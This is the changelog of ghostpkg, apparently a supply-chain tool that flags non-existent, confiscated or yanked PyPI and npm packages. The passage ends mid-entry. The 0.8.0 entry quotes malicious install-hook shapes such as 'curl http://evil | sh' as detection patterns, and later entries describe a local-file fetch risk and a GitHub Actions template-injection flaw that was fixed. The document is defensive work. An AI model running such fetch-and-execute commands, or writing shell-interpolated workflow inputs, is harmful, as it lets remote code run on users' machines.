# Changelog

All notable changes to this project are documented here.
Format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/);
this project uses [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

## [0.24.1] - 2026-09-04

### Documentation
Three claims that outlived the behaviour they described, found by re-reading
both READMEs against a live run before publishing the Action.

- **The cache paragraph still said "does not exist is held for only an hour"**
  in both languages, and contradicted itself three hundred lines later with
  "negatives are never cached". The second is true. The first described the
  precise failure this tool exists to avoid, and an earlier patch had missed
  the wording. It now also explains why the rule runs in both directions: a
  free name can be registered at any moment, and a name published a moment ago
  404s briefly because PyPI's feed announces it before the JSON API serves it.
- `CONTRIBUTING.md` still described the popular-name list as PyPI-derived and
  npm typo detection as weak because of it. There have been 2,000 names per
  ecosystem for some time.
- The usage comment in `.pre-commit-hooks.yaml` pinned `v0.19.0`.

Verified live rather than by reading: every flag in `--help` appears in both
options tables, the documented exit codes match, `--format github` emits the
annotation exactly as shown, and the `--json` envelope matches its example.

## [0.24.0] - 2026-09-04

The gate now runs in CI, and it scanned **88,904 packages across sixteen
repositories**. Six blocks, and **all six are real** -- unsatisfiable pins in
Ray and a package next.js references that was never published. Zero false
positives at that scale is the number this project exists to hold.

### Added
- **A scope the project already leans on is no longer treated as a stranger.**
  Almost all remaining noise was "published under a year ago" on the dozen
  platform binaries a compiled tool ships at once:
  `@oxfmt/binding-darwin-arm64`, `@oxc-parser/binding-linux-riscv64-musl`.

  The justification is structural rather than statistical: **an npm scope is
  owned**. To publish `@oxfmt/anything` you must control `@oxfmt`, so a young
  package in a scope the scan already depends on three times over is the same
  publisher shipping another build.

  Measured before it was built -- two members silences 41% of warnings, three
  silences 40%, six silences 39%, so the threshold sits where it is defensible
  rather than where it is largest. In practice: Sentry **114 warnings to 22**,
  Vue **15 to 5**, and no change whatever to the block count. A squatted scope
  (`@types-node` is not `@types/node`) appears once in a scan, not three times,
  which is what the threshold separates. Nothing that blocks is affected, and
  neither is the lookalike check.

- **`.github/workflows/field.yml`** runs the gate nightly and on any push that
  touches the scanner. On Linux, because `vercel/next.js` cannot be cloned on
  Windows -- a path in its test fixtures exceeds the limit, so the largest
  monorepo in the set was unreachable until now.

- The repository list is **sixteen**, each carrying a note saying which defect
  it found, so a future reader can tell why the list is what it is instead of
  trimming it for being slow.

### Verified
`EXPECTED` now records the three names that genuinely do not exist, each
checked against the registry by hand: `jaxlib==0.4.17` (PyPI's oldest is
0.4.18), `tensorflow-macos==2.20.0` (Apple stopped at 2.16.2), and
`tsconfig-mod` (404 on npm).

707 tests.

## [0.23.0] - 2026-09-04

Mutation testing: 186 single-line changes to the source, each run against the
whole suite. **53 left it green.** The code was right in every case -- what was
missing was anything that would notice if it stopped being. Writing the tests to
kill the survivors turned up a real bug the suite had never had a chance to see.

### Fixed
- **A version in an install command made prose extraction skip the whole
  command.** `npm install react@18` and `pip install flask==3.0` both yielded
  nothing: the `@` was read as a direct reference and the `==` stopped the token
  matching the name pattern. A pinned install command is the commonest form
  there is, so the feature built to read install commands was silently skipping
  most of them.

  The version is now split off and carried through, so a hallucinated *version*
  in a README is checked as well as a hallucinated name. Re-measured on 22 real
  READMEs, because widening this parser has cost false positives before: 19
  names, **none that fail to exist**.

### Added
Tests for the survivors that carry a real consequence:
- **Each finding keeps its own file and line.** Reversing the thread pool's
  result list left all 656 tests passing -- the printed names still looked
  right, because a finding carries its own name, but the origin stamped on it
  came from a different package. A CI annotation would have pointed at the
  wrong line and marked the wrong one clean.
- **`--deep` and `--strict` reach the scan.** Both could be forced to `False`
  in the call without a single failure: the flag would silently do nothing.
- **A name from prose keeps its own ecosystem**, so `npm install left-pad` in a
  README is not looked up on PyPI.
- Chained commands (`cd app && npm install x`), unknown installers
  (`brew install jq`), age measured from the first upload rather than the
  latest, `cache.put` refusing a negative, `-r base.txt  # comment` still
  following the include, and the error counts in both output formats.

693 tests. Field gate: 4,461 packages, zero blocks.

## [0.22.0] - 2026-09-04

Four agents scanned **21 repositories and 78,000 package names**. They found
**51 false blocks** and not one true positive among them, plus twelve places
where the documentation described a different tool.

### Fixed -- false blocks
- **pnpm v5 keys with a peer suffix (17 blocks).** `/react-dom/18.2.0_react@18.2.0`
  was read as a package called `react-dom/18.2.0_react`. The peer suffix carries
  an `@digit` of its own, so hunting for the first one found the wrong `@`. The
  version is now located by structure -- in a v5 key the last slash-separated
  segment starts with a digit -- which also fixed `eslint-plugin-react`,
  `tsutils` and `@babel/helper-compilation-targets`.
- **pnpm `name@file:path` keys (8 blocks).** The protocol is only a prefix in
  v5; from v6 it follows `name@`. A protocol is now looked for anywhere in the
  key, since a `:` cannot occur in a published npm name.
- **A yarn `npm:v1.1.0` range (2 blocks).** The leading `v` made a version range
  look like an alias to a package called `v1.1.0`.
- **Checksum files read as requirements (5 blocks).** Airflow keeps 127 files
  whose entire content is one MD5; five carry `constraints` in the name, and a
  32-character hex string is a legal PEP 508 name.
- **Materialised symlinks (4 blocks).** Git writes a symlink as a plain file
  holding its target where the filesystem has no symlink support, so
  `requirements_compiled_py3.10.txt` contained the line
  `requirements_compiled.txt` -- read as a package.
- **PEP 440 local versions (17 blocks).** PyPI refuses an upload carrying one,
  so `torch==2.9.0+cu128` can never match a release list. Ray pins every CUDA
  build that way.

The first attempt at the last two rejected any name ending in `.yaml`, `.cfg`
or `.ini` as well. `ruamel.yaml`, `ruamel.yaml.clib` and `pytest.ini` are all
real packages, so that would have traded a false block for a silent miss on
three of them. The guard is now two extensions and only on a line with no
version.

### Fixed -- flags
- **`--timeout` now reaches `--deep`**, which downloaded archives on a fixed
  budget of its own, and **`--timeout 0` is refused** rather than silently
  ignored.

### Documentation
Both READMEs stated that **"does not exist" is cached for an hour** and then, 300
lines later, that negatives are never cached. The second is true; the first
described the precise failure this tool exists to avoid. Also corrected: `-e`
does not apply to `scan`; `--format` and `--config` were in no options table;
"only one release" and "no repository link" are age-gated; the action's
`install` and `config` inputs were undocumented; the prose measurement was
stale in English; `data.py` has been per-ecosystem for some time; and the CI and
pre-commit snippets pinned a version whose own changelog records a false
all-clear.

656 tests. Field gate: 4,461 packages, zero blocks.

## [0.21.0] - 2026-09-04

Three more false blocks, all found by a new release gate that scans large real
repositories instead of synthetic manifests. On `home-assistant/core` alone the
count went **39 -> 0**.

### Added
- **`scripts/fieldtest.py`, a release gate.** It clones five repositories chosen
  for the dependency shapes they contain, scans each, and fails on any block
  not listed with a reason. Every name in those projects is something thousands
  of people install daily, so **every block is false until shown otherwise**.
  Current state: **4,461 packages checked, zero blocks.**

  This exists because 605 unit tests and a 35-check acceptance pass had missed
  eleven defects that one pass over real repositories found immediately.

### Fixed
- **A constraints file forbids; it does not install.** `pip` never installs
  from one -- it only bounds a version if the package arrives some other way --
  so the standard way to forbid a package outright is to pin it to a version
  that cannot exist. Home Assistant does this for eight of them
  (`pycrypto==1000000000.0.0`), and checking those pins turned deliberate
  exclusions into **35 reported blocks**. The flag now survives nested `-c` and
  `-r` includes. The name in a constraints file is still checked.
- **PEP 440 pads the release segment with zeros.** `0.8` and `0.8.0` are one
  version, as are `1.6.6` and `1.6.6.0`. Both spellings sit in Home Assistant
  requirements against packages that store the other form, and comparing the
  raw text blocked `libsoundtouch` and `baidu-aip`. Worse, the test suite had
  asserted the *opposite* -- that `1.0` and `1.0.0` differ -- so the wrong
  behaviour was locked in by a test. Corrected, and the padding is now
  asserted.
- **A block no longer rests on a cached version list.** An established package
  is cached for a day, so a release published inside that window is invisible;
  `opower==0.21.0` exists and was blocked from a stale list. The version list
  is now re-fetched before any version block, which is the same rule that
  already governs negative answers: the answer that blocks has to be fresh.

614 tests.

## [0.20.0] - 2026-09-03

Four defects found by scanning **10,109 packages** across `vercel/next.js`,
`home-assistant/core` and `getsentry/sentry`. Those three repositories produced
53 blocks and **every one of them was false**. None of these shapes occur in a
small synthetic manifest, which is why 571 tests and a 35-check acceptance pass
had missed all four.

### Fixed
- **`ghostpkg check -e npm "@scope/name"` reported success having checked
  nothing.** The names went through the PEP 508 requirements parser, whose
  pattern demands an alphanumeric first character, so every scoped npm name was
  dropped in silence -- the run printed "all 0 packages look fine" and exited
  0. On the command this tool is named for, and for a quarter of the npm
  namespace. A false all-clear is worse than any false positive, and this is
  the most serious defect the project has shipped.
- **A pinned version was compared as text rather than as a version.**
  `aiopurpleair==2025.08.1` was blocked as non-existent while `pip download`
  installed it happily: PyPI stores the canonical `2025.8.1`. Comparison now
  normalises both sides -- leading zeros, a leading `v`, `-`/`_` separators and
  the pre-release spellings. Three such pins sit in unmodified Home Assistant
  requirements, and a false block breaks a build.
- **A package the checkout provides itself is no longer looked up.** All three
  names blocked in a 6,335-package scan of `vercel/next.js` were the
  repository's own packages, `@next/font` among them. A monorepo depends on
  itself, and not always through `workspace:*` -- an exact pin is just as
  common. Names declared by any `package.json` or `pyproject.toml` in the scan
  are now excluded, which is the same rule as `workspace:` stated differently.
- **`MANIFEST.in` is no longer read as a requirements file.** `.in` is the
  pip-tools convention and also the extension of a packaging directives file.
  Read as requirements it reported `graft` as a package that exists -- there is
  a real project of that name -- and blocked `recursive-exclude`.

### Documentation
- The `--json` example showed the bare array from before 0.14.0. It is a
  `{schema, tool, summary, findings}` envelope, and the documented example now
  matches, including `source` and `line`.

605 tests.

## [0.19.3] - 2026-09-03

Found by reviewing the published 0.19.2 rather than the working tree. Two of
the four are false blocks, which this project treats as its worst failure, and
both have the same cause: `jslocks.py` was written after the test file that
exists to defend the rule "a dependency naming its own source is not the
registry's business", so `yarn.lock` and `pnpm-lock.yaml` were never covered by
it.

### Fixed
- **A yarn `owner/repo#ref` dependency was blocked.** GitHub shorthand was
  handled for `package.json` and missed in `yarn.lock`, so
  `internal-lib@acme/internal-lib#v1.2.3` was looked up on npmjs, found absent,
  and reported as a package that does not exist.
- **A pnpm git or URL dependency produced a nonsense package name.** The
  protocol is only a prefix in lockfile v5; from v6 it follows `name@`, so the
  guard never fired. `github.com/acme/forked/abc123` was read as a package
  called `github.com/acme/forked`, and
  `foo@https://codeload.github.com/...` as one called
  `foo@https://codeload.github.com/acme/foo`. Both were then blocked.
- **`--timeout` did nothing.** `def _get_json(url, timeout=TIMEOUT)` bound the
  module global once, at import; the CLI assigned `registries.TIMEOUT` and
  nothing ever re-read it, so every request used 15 seconds regardless.
- **`.windsurfrules` was found and never scanned.** The directory search
  offered it up, the parser refused it, and the CLI ignores an unreadable
  *discovered* file on purpose -- so nothing was printed. There is now a test
  asserting that every file the search returns can actually be parsed.

### Added
- End-to-end tests for suppression. The ignore file was loaded and applied in
  `main()` only, and nothing asserted its effect on a verdict or an exit code:
  the entire policy call could be replaced with `used = []` and all 539 tests
  still passed. Three tests now cover the real path, and they fail against that
  stub.

571 tests.

## [0.19.2] - 2026-09-02

Found by throwing hostile input at the parsers rather than by reading them.

### Fixed
- **A byte-order mark broke seven of the eight manifest formats, four of them
  silently.** A file saved by Notepad, PowerShell's `Out-File`, or an editor set
  to "UTF-8 with BOM" starts with U+FEFF. `pyproject.toml`, `package.json` and
  `package-lock.json` raised a parse error; `poetry.lock`, `pnpm-lock.yaml` and
  prose files returned **zero** packages; `requirements.txt` dropped only its
  first line and the run then reported that everything looked fine. Files are
  now read as `utf-8-sig`, which strips the mark when present and is identical
  to `utf-8` when it is not, and every parser that takes text strips it too.
- **An empty dependency key is no longer treated as a package name.**
  `{"dependencies": {"": "^1"}}` produced an empty name, and the npm client then
  requested `https://registry.npmjs.org/` -- the registry root -- and read
  whatever came back as facts about it.
- **`===` is recognised as a pin.** PEP 440 arbitrary equality is the only way
  to name a version that does not normalise, and such a pin was never checked.
- **A different spelling of a popular name is not a typo of it.** PyPI treats
  `-`, `_` and `.` as one separator, so `typing_extensions` and
  `typing-extensions` are the same project; comparing the raw spelling against
  the popular-name list missed the match and made the package a one-edit typo of
  itself. Unreachable in the product -- PyPI resolves both spellings, so the
  name always exists -- but `nearest_popular` is public and the reasoning cost
  more to reconstruct than the fix. npm names are still compared as written,
  because `JSONStream` and `jsonstream` are two different real packages there.

### Considered and rejected
- **Reading `setup.py` with `ast`, without executing it.** Attractive on the
  raw count -- 1.4M repositories have one. Measured across sixteen well-known
  Python projects: **zero** had an `install_requires` an AST could read. Eight
  have no `setup.py` at all, five have one with no `install_requires`, and three
  compute it at runtime. The parser would read nothing on real projects.
- **Auditing the installed environment.** The idea was to catch a package that
  was removed from the registry after it was installed. Across 103 distributions
  in four environments, **none** was missing upstream, so the case cannot be
  verified -- and everything else such a command could report is the soft
  signals that already measured 100% false on age alone.

## [0.19.1] - 2026-09-02

### Documentation
Both READMEs had fallen behind the tool. The PyPI page is the English one, so
this is what people read before installing anything.

- **New section: monorepos and private packages.** The rule that a dependency
  naming its own source is not the registry's business arrived in 0.15.0 and was
  never written down -- so a monorepo user had no way to know it works. A table
  now names every form: `workspace:`, `catalog:`, `file:`, `link:`, `portal:`,
  git and URL specifiers, `npm:` aliases, `[tool.uv.sources]`, Poetry
  `{ git = ... }`, `[package.source]`, and workspace members in a lockfile.
  Private registries are covered too, with the reason they are left alone.
- **New section: measured, and not built.** Seven ideas that were prototyped,
  measured and dropped, each with its number: the 100% false-positive scoring
  design, `os.environ` at 37%, the age gate at 2.54%, cached negatives, PEP 740
  attestations at a 5% overlap, npm `deprecated` at 5.78%, and the hallucinated-name
  corpus rejected on principle. What a security tool refuses to do says more
  about its judgement than its feature list.
- The signals table documents the `did you mean ...?` suggestion, and the
  examples show the file and line a finding came from.
- The manifest table now states what `pyproject.toml` skips via
  `[tool.uv.sources]`, what `poetry.lock` and `uv.lock` skip via their source
  fields, and that prose extraction reads commands written inside a sentence.
- Prose numbers updated to the current measurement: 18 names across 22 READMEs,
  0% that do not exist.

Rendering was checked with `readme_renderer`, the library PyPI itself uses:
41,576 characters, 11 tables, no relative links and no images that resolve only
on GitHub.

## [0.19.0] - 2026-09-02

Both of these came out of an acceptance pass against the published package
rather than the working tree: 35 checks, two of which failed.

### Added
- **A name that does not exist now says what it was probably meant to be.**

  ```
  BLOCKED  reqeusts
           - does not exist on pypi
           - did you mean requests?
  ```

  The age gate that guards this comparison elsewhere exists to stop a
  legitimate published package being called a typo. A name that does not exist
  has no legitimacy to protect and is already blocked, so a suggestion can only
  help someone fix the line. Measured: correct on **11 of 11** plausible typos,
  and silent on **6 of 6** invented names -- the shape a hallucination usually
  takes. The block still comes from `GP001`, so suppressing the suggestion
  cannot change a verdict.

- **Install commands written inside a sentence are read.** Prose puts them in a
  backtick span rather than on a line of their own:

  > Install using `pip install -U pydantic` or ...
  > _Black_ can be installed by running `pip install black`.

  **Three of fourteen** popular project READMEs write it only this way, and
  reading whole lines found nothing at all in them. A span is explicit markup
  saying "this is a command", so the installer rules still have to match and a
  span that is not a command yields nothing.

  Re-measured after the widening, because this feature was once wrong 25% of
  the time: **18 names across 22 READMEs, 0% that do not exist.** Coverage on
  the original fourteen went from 5 to 9.

### Fixed
- `fastapi[standard]` is read as `fastapi`. The extras belong to the
  requirement rather than the name, and rejecting the whole token dropped the
  command with it.

## [0.18.1] - 2026-09-02

### Security
- **The GitHub Action no longer interpolates its inputs into the shell script.**
  `${{ inputs.paths }}` was substituted into the *text* of the step before bash
  parsed it, so an input carrying a quote or a semicolon became part of the
  command rather than an argument to it -- GitHub Actions template injection.
  The same applied to `version`, `strict`, `deep` and `fail-on-error`.

  Every input now arrives through `env:` and is read as a shell variable, which
  makes it data rather than script. `paths` is split into an array explicitly,
  so several paths still work; a path containing a space has to be passed on its
  own.

  Anyone pinned to `@v0.18.0` should move to `@v0.18.1`. Exploiting it required
  a workflow that passes attacker-influenced text as an input -- the defaults
  are static -- but that is a thin defence for a tool whose subject is
  supply-chain trust, and it is not the example to set.

  `tests/test_action.py` now fails if any `${{ }}` appears inside a `run:` body,
  if an input stops being passed through `env:`, or if an expansion is left
  unquoted, and it runs the real splitting logic against a payload that tries to
  inject a command. PyYAML is a dev dependency for this; the runtime still has
  none.

## [0.18.0] - 2026-09-02

### Added
- **A GitHub Action.** `uses: M1rwana12/ghostpkg@v0.18.0` is the whole step.
  Inputs: `paths`, `strict`, `deep`, `version`, `python-version`,
  `fail-on-error`.
- **A pre-commit hook.** `repo: https://github.com/M1rwana12/ghostpkg` with
  `id: ghostpkg`. It receives only the staged files that match, so it costs one
  registry lookup per changed dependency rather than a full scan per commit.
- **`--format github`** emits workflow commands, so a pull request is annotated
  on the offending line instead of the answer sitting in a job log. A blocking
  finding is an error and a soft signal is a warning, which keeps the
  annotations and the exit code in agreement about severity. `%`, newlines,
  `:` and `,` are escaped, since an unescaped one silently truncates or splits
  the annotation.
- **Findings carry the file and line the name came from**, in the text output
  (`ghost-pkg  (requirements.txt:12)`) and in `--json` as `source` and `line`.
  Once a scan can search a whole directory, "does not exist" without saying
  which of six files it came from is a finding the reader has to go looking for.
  A name written in two files now produces a finding for each, still on one
  registry lookup.

### Internal
- A `publish.yml` workflow for PyPI Trusted Publishing, so releases are built
  in CI from a tag and signed by an OIDC exchange rather than uploaded from a
  laptop with a token in the shell. It runs only when started by hand until the
  publisher is registered on PyPI.

## [0.17.0] - 2026-09-02

### Added
- **`ghostpkg scan` accepts a directory, and defaults to the current one.**
  `ghostpkg scan .` previously answered "that is a directory, pass a manifest
  file" and exited 2, so using the tool on a project meant knowing and naming
  every dependency file by hand -- dozens of them in a monorepo.

  Two rules keep the result small enough to read:

  - **Vendored and generated trees are skipped**: `node_modules`, `.venv`,
    `.git`, `dist`, `build`, `vendor`, `__pycache__` and the rest.
    `node_modules` alone holds a `package.json` for every installed package, so
    walking into it would turn one scan into thousands of lookups of things
    already on disk.
  - **A lockfile supersedes the manifest beside it.** A lockfile is that
    manifest resolved, so it names everything the manifest does plus the
    transitive dependencies; reading both prints most packages twice and checks
    nothing extra. This applies within one directory only, so a workspace
    member's own `package.json` is still read.

  Agent instruction files (`AGENTS.md`, `CLAUDE.md`, `.cursorrules`) are picked
  up wherever they appear, and the README at the root of the search -- but not
  Markdown in general, which in a large repository is mostly changelogs and
  documentation.

  Measured on a fresh clone of `pallets/flask`: six files found in 2.6 seconds,
  with the root `pyproject.toml` correctly superseded by `uv.lock`.

### Changed
- A file **named on the command line** that cannot be parsed is still an error.
  A file found by searching a directory is skipped instead: refusing to scan a
  whole project because one unrelated file in it is malformed would make the
  directory form unusable. An empty result still exits 3, never 0.

## [0.16.0] - 2026-09-02

### Added
- **`pnpm-lock.yaml` and `yarn.lock` are read.** Measured across twenty popular
  JavaScript repositories, `package-lock.json` -- the only npm lockfile
  ghostpkg could read -- was present in **two** of them; `pnpm-lock.yaml` was in
  ten and `yarn.lock` in six. Four out of five projects had a lockfile the tool
  refused to open.

  Both are read line by line rather than with a YAML library, for the same
  reason `pyproject.toml` has a hand-written fallback: a supply-chain tool that
  installs a dependency tree of its own undermines its own argument.

  - `pnpm-lock.yaml`: lockfile versions 5 (`/react/18.2.0`), 6
    (`/react@18.2.0`) and 9 (`'react@18.2.0'`), including v9 peer resolutions in
    parentheses and v5 peer suffixes after an underscore.
  - `yarn.lock`: classic (v1) and berry (v2+), several descriptors per key, and
    berry aliases -- `@babel-baseline/cli@npm:@babel/cli@7.27.1` is checked as
    `@babel/cli`, the name that actually gets installed.
  - Both apply the stated-source rule from 0.15.0: `workspace:`, `link:`,
    `patch:`, `portal:`, `exec:`, `file:` and git or http descriptors are not
    registry names.

  Validated against the real lockfiles of React, Babel, Jest, Svelte, Vue and
  Vite: **3,292 packages, zero blocks.**

### Fixed
- **A string `repository` field no longer crashes a scan.** npm documents both
  `{"url": ...}` and the shorthand `"github:user/repo"`; ghostpkg assumed the
  object and raised `AttributeError`, which aborted the whole run. It surfaced
  the first time a lockfile was wide enough to contain one -- 435 packages in.
  `parse_npm` is now separate from the request, so registry response shapes are
  testable without a network round trip.

## [0.15.0] - 2026-09-02

### Fixed
- **A dependency that names its own source is no longer looked up on the public
  registry.** The rule was already in the codebase for `name @ url` in a
  requirements file, and had never been applied to the other four parsers. Each
  of these was measured against real files:
  - `pyproject.toml`: **pydantic's own manifest was blocked.** `pydantic-docs`
    is declared in a dependency group and pointed at a git repository by
    `[tool.uv.sources]`; it is not on PyPI, so ghostpkg reported it as
    non-existent. Poetry dependencies given as `{ git = ... }`, `{ path = ... }`
    or `{ url = ... }` had the same problem.
  - `package.json`: a monorepo produced **six false blocks out of nine** --
    `workspace:`, `catalog:`, `file:`, `link:`, `portal:`, `git+`, tarball URLs,
    `github:` and `owner/repo` shorthand, and relative paths.
  - `package.json`: two entries were **silently checked under the wrong name**.
    `link:../linked` was looked up as `linked`, an unrelated real package, and
    reported fine. `npm:lodash@^4` is an alias, so the name to check is
    `lodash`; ghostpkg checked the key instead.
  - `package-lock.json`: workspace members keyed by a plain path were treated as
    registry packages, and `resolved` was ignored -- a git-resolved entry named
    `patched` matched an unrelated package and produced a confident
    "version 1.0.0 does not exist" about it.
  - `poetry.lock` / `uv.lock`: Poetry's `[package.source]` sub-table and uv's
    inline `source = { git = ... }` / `{ editable = ... }` / `{ directory = ... }`
    were ignored.

  This is the failure mode the project treats as worse than a miss, so the fix
  came before anything else. 41 tests were added, 35 of which fail against the
  previous parser.

- **Entries resolved from a private npm registry are left alone.** A corporate
  registry proxies public names *and* hosts private ones under one host, and a
  lockfile does not say which is which. Known public mirrors
  (`registry.yarnpkg.com`, `registry.npmmirror.com`) are still checked, because
  silently checking nothing and reporting success is the failure this project
  already shipped once.

## [0.14.0] - 2026-09-01

### Changed
- **`--json` now returns a versioned envelope** rather than a bare array, with
  a tool name and version, summary counts, and `exists` / `latest_version` on
  each finding. A consumer could not previously tell what produced the output
  or what shape to expect.

### Internal
- Split `cli.py` (361 lines, doing four jobs) into `scanner.py` -- lookups and
  verdicts -- and `report.py` -- presentation -- leaving the CLI to argument
  parsing and exit codes. The two new modules need no terminal, which is what
  a hook or an editor would want to call.

### Considered and rejected: PEP 740 attestations
The idea was to use a verified attestation to *suppress* warnings rather than
add signals, which fits the project's constraints exactly. It did not survive
measurement.

An attestation proves **provenance, not benevolence** -- an attacker can
publish a slopsquat through Trusted Publishing from their own repository just
as easily. So it honestly refutes only one of the warnings, "no repository
link", by supplying that exact missing fact.

Measured across 38 packages from the live PyPI feed: 13 carried an attestation,
8 lacked a repository link, and **2 were in both groups**. A 5% benefit for two
extra HTTP requests per flagged package, since the data is only exposed through
the simple API rather than the endpoint already being fetched. Not built.

## [0.13.0] - 2026-09-01

### Added
- **Prose files are scanned for install commands.** `README`, `AGENTS.md`,
  `CLAUDE.md`, `.cursorrules`, any `.md`/`.mdx`/`.rst`.

  This closes an ordering problem the tool had from the start: **the
  hallucination arrives before the manifest does.** A model writes
  `pip install foo-bar` into a README or an agent instruction file, a person
  copies the line and runs it, and the install has already happened by the time
  that name reaches `requirements.txt`. Scanning only manifests meant arriving
  after the fact.

  Recognises `pip`, `pip3`, `python -m pip`, `uv add`, `uv pip install`,
  `poetry add`, `pipx`, `conda`, `npm`, `pnpm`, `yarn`, `bun`, and the runners
  `npx`, `bunx`, `uvx`. A single file may name both ecosystems, and each
  dependency now carries the one its command implies.

### The measurement that shaped it
A README is full of words that look like package names, so the first version
was checked against ten real ones and produced a **25% false-positive rate**:
`pip install httpx. The command line client is an optional dependency.` gave
back `The`, `command`, `line`, `client` and `is`, because the command ran past
the end of its sentence.

Extraction now stops at the first token that is not a package argument.
Re-measured across thirteen real READMEs — `requests`, `flask`, `httpx`, `ruff`,
`pydantic`, `react`, `vite`, `prettier`, `axios`, `fastapi`, `poetry`, `pytest`,
`webpack`, `lodash` — that is **0%**, while the genuine names are still found.

Anything ambiguous is dropped rather than guessed at: `pip install -r
requirements.txt`, `pip install -e .`, `npm run build`, `pip is a package
manager`, a URL containing the word install, and `npx create-react-app my-app`
(where `my-app` is an argument, not a package) all yield nothing.

## [0.12.0] - 2026-09-01

Two cases the tool used to call **ok**. Both share a shape an existence check
cannot see: the thing *exists*, so the check stops there.

### Added
- **`GP011` -- names the registry confiscated.** When npm removes a package for
  malware it does not delete the name and does not answer 451: it republishes a
  placeholder it owns, pointing at `github.com/npm/security-holder`. `crossenv`
  and `ffmepg`, both real typosquat incidents, look exactly like that -- and
  because the placeholder exists, ghostpkg reported them as **fine**. They are
  blocked now.

  Measured before shipping: 3 of 3 known confiscated names caught, **0 of 200**
  most-downloaded npm packages flagged. Detection matches the repository URL
  rather than the "security holding package" description, because a description
  is free text anyone could copy.

- **`GP010` -- withdrawn versions.** A pinned version the maintainer yanked is
  reported, with the reason they gave: `requests==2.32.0` comes back with
  "Yanked due to conflicts with CVE-2024-35195 mitigation". It warns rather than
  blocks -- the version exists, and pip installs a yanked one when it is pinned
  explicitly, so blocking would be stricter than the package manager itself.

  **PyPI only.** npm's nearest equivalent is `deprecated`, and measurement said
  no: `yanked` covers 0.38% of versions across a dozen popular projects, while
  `deprecated` covers 5.78% and reaches 160 of `glob`'s 168 versions, because
  npm uses it routinely for superseded branches. That is noise, not signal.

## [0.11.0] - 2026-09-01

### Security
- **`--deep` only fetches `https`.** The archive URL comes out of the registry
  response, so it is data we were handed rather than a value we chose. Against
  public PyPI and npm that is fine, but a mirror, a proxy or a private registry
  could answer with `file:///etc/passwd` or an address on the internal network,
  and `--deep` would have fetched and pattern-matched it.

### Added
- Tests for the registry client, run against a local HTTP server so the suite
  still needs no internet. This is where the worst bug in the project lived and
  went untested: a connection that stalled or reset *while the body was being
  read* escaped as a traceback and exited `1` -- the code that means "this
  package does not exist". Covered now, along with status mapping, gzip,
  oversized responses, retry bounds and `Retry-After` capping.

**237 tests.**

## [0.10.0] - 2026-09-01

### Added
- **Stable rule identifiers.** Every finding now carries one -- `GP001` for a
  package that does not exist, `GP002` for a pinned version that does not,
  through to `GP009`. They appear in `--json` and are what an ignore file
  matches on. Nothing else is possible without them: you cannot let someone say
  "not this one" until each finding has a name that will not change.
- **An ignore file**, so one false positive does not mean the check gets
  removed from CI. Three decisions shape it:
  - **It is never read from the project directory.** ghostpkg is meant to sit
    in front of a coding agent, and an agent with shell access can edit files
    in the repository it is working on. A `.ghostpkgignore` next to the code
    would be a suppression list the guarded thing can rewrite. The file comes
    from `--config`, from `GHOSTPKG_CONFIG`, or from the user's own config
    directory.
  - **A reason is required.** An entry nobody can justify in a sentence is one
    nobody will dare remove later.
  - **A malformed file is an error.** Degrading quietly to "no suppressions"
    would be safe; degrading quietly to "no protection" would not, and from
    outside the two are indistinguishable.
- Entries take glob patterns, an optional `ecosystem` and `rule` to narrow
  them, and an optional `expires` date so a suppression does not become
  permanent by accident.

Example, for the case this exists for -- a company with its own index:

```json
{
  "ignore": [
    { "package": "acme-*", "rule": "GP001",
      "reason": "internal, lives on our own index" }
  ]
}
```

### Changed
- Suppressing the reason that caused a block downgrades the verdict rather than
  leaving a block with no explanation behind it. Under `--strict` every reason
  blocks, so removing one is not enough -- which is the correct behaviour, and
  is tested.
- `--json` reasons are now objects with `rule` and `text` instead of bare
  strings.

## [0.9.0] - 2026-09-01

### Added
- **Lockfiles.** `package-lock.json` (both the v1 nested and v2/v3 `packages`
  layouts), `poetry.lock` and `uv.lock`. This matters more than the manifest
  formats already supported: CI installs from the lockfile, so it holds the
  names that actually get fetched, including transitive ones a manifest never
  mentions. Every entry is version-pinned, so all of them are checkable.
- **`scan` takes several files at once**, and they may be different
  ecosystems: `ghostpkg scan requirements.txt package.json package-lock.json`.
  A dependency repeated across files costs one lookup, not one per file.
- **Retry with backoff on rate limiting.** Registries answer 429 and 503 under
  load, and giving up immediately turned a busy moment into a failed run.
  `Retry-After` is honoured when sent, capped at 30 seconds.
- `--workers N` and `--timeout SECONDS`, which were fixed constants.

### Changed
- **New exit code `3`: nothing was scanned.** A manifest that yielded no
  dependencies exited `0`, which reads as "checked, all clean" in CI. `0` now
  means checked and clean, `3` means there was nothing to check.

## [0.8.0] - 2026-09-01

### Added
- **Pinned versions are checked.** `requests==99.99.99` used to come back "ok"
  because only the name was looked up. A version a model invented is the same
  class of mistake as a name it invented, and just as precise to check: the
  registry response already lists every real version, so this costs nothing
  extra. Only exact pins are checked -- `==1.2.3` on PyPI, a bare `1.2.3` on
  npm. Ranges like `>=2.31` or `^4.18.0` may be satisfied by some other
  version, so there is nothing definite to say about them.
- `ghostpkg check requests==2.31.0` accepts a pin on the command line too.

### Fixed
- **`--deep` missed essentially every realistic malicious npm hook.** The
  patterns were written for Python and JavaScript *source*, but npm install
  hooks are *shell commands*. `curl http://evil | sh` carries no `curl -` flag
  to match, `node -e` is not `eval(`, and `powershell -c IWR` looks nothing
  like `urllib.request`. All six shapes now match, and nine ordinary hooks
  (`tsc`, `node-gyp rebuild`, `husky install`, …) stay clean.
- **`"postinstall": "node install.js"` is now followed.** It is the commonest
  shape of all, and the code that matters is in the file it names, which was
  never read.
- **`--deep` no longer passes a package it could not inspect.** A package with
  no source archive, or one larger than the size limit, was silently treated
  like a clean result -- so padding an archive was a way to switch `--deep` off
  from the outside. It now says so and warns.
- **A negative result is never cached.** Caching it for an hour seemed safe
  until a real case appeared: PyPI's RSS announces a package a moment before
  its JSON API serves it, so a lookup 404s, and a legitimately published
  package was then reported as non-existent for the rest of the hour. A stale
  block is the worst failure this tool has. Positive results are still cached.
- **The reported nearest name is deterministic.** Iterating a frozenset has no
  defined order, so `cjson` came back as `ujson` or `ijson` depending on
  `PYTHONHASHSEED`.

### Changed
- The parser now carries each dependency's version specifier and line number
  rather than the bare name.

## [0.7.0] - 2026-09-01

A correctness release. Several of these were **silent** failures -- the tool
reported success having never performed the check, which for a security tool is
worse than crashing. Found by a systematic audit rather than by users.

### Fixed -- silent misses
- **Every package whose name begins with `http` was dropped from
  `requirements.txt`.** A filter meant to skip bare URLs matched names too, so
  `httpx`, `httpcore`, `httplib2` and friends were never checked and the tool
